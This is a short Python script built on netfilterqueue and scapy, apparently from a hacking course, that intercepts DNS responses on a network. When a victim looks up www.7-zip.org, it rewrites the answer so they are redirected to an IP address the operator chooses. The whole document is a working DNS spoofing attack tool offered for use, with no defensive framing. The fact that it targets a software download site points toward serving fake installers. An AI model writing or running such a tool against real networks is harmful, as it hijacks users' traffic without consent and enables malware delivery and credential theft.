import netfilterqueue
import scapy.all as scapy
import optparse


def get_host():
    parser = optparse.OptionParser()
    parser.add_option("-r", "--redirect", dest="host", help="Enter the IP of website to redirect")
    options = parser.parse_args()
    return options


(options, arguments) = get_host()


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        target = "www.7-zip.org".encode()

        if target in qname:
            print("Victim is browsing",qname,"website.")
            dns_answer = scapy.DNSRR(rrname = qname, rdata = options.host)
            scapy_packet[scapy.DNS].an = dns_answer
            scapy_packet[scapy.DNS].ancount = 1
            new_packet = set_load(scapy_packet)
            packet.set_payload(bytes(new_packet))
            print(scapy_packet.show())

    packet.accept()


def set_load(scapy_packet):
    del scapy_packet[scapy.IP].len
    del scapy_packet[scapy.IP].chksum
    del scapy_packet[scapy.UDP].len
    del scapy_packet[scapy.UDP].chksum
    return scapy_packet

queue = netfilterqueue.NetfilterQueue()
queue.bind(123, process_packet)
queue.run()
